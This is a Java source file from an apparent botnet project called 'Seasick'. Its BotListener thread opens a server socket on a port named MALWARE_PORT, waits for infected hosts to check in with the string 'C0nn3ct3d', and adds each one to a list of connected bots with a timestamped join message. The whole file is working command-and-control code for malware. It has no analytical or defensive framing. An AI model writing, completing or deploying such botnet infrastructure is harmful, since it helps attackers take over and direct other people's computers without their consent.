package uk.tsis.seasick.threads;

import uk.tsis.seasick.Seasick;
import uk.tsis.seasick.obj.Bot;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class BotListener extends Thread{

    public static List<String> joinMessages = new ArrayList<>();
    private ServerSocket serverSocket = null;
    private Socket socket = null;
    private BufferedReader reader = null;

    public static String getDate(){
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("HH:mm:ss");
        return simpleDateFormat.format(new Date());
    }


    @Override
    public void run(){
        this.setName("bot-listener");
        try {
            serverSocket = new ServerSocket(Seasick.MALWARE_PORT);
            while (true) {
                socket = serverSocket.accept();
                reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                Bot bot = new Bot(socket.getInetAddress().getHostAddress());
                String msg = reader.readLine();
                if (msg != null){
                    if (msg.equals("C0nn3ct3d")){
                        //if (bot.isMalwareRunning()) {
                            Seasick.connectedBots.add(bot);
                            joinMessages.add("[Seasick] New Bot Connected -> " + bot.getHost() + " | Time Connected: " + getDate() + " // Current Time: %s");
                        //}
                    }
                }
            }
        }catch (IOException e){
            System.out.println("Socket Err in thread: " + this.getName());
            System.exit(0);
        }
    }

}
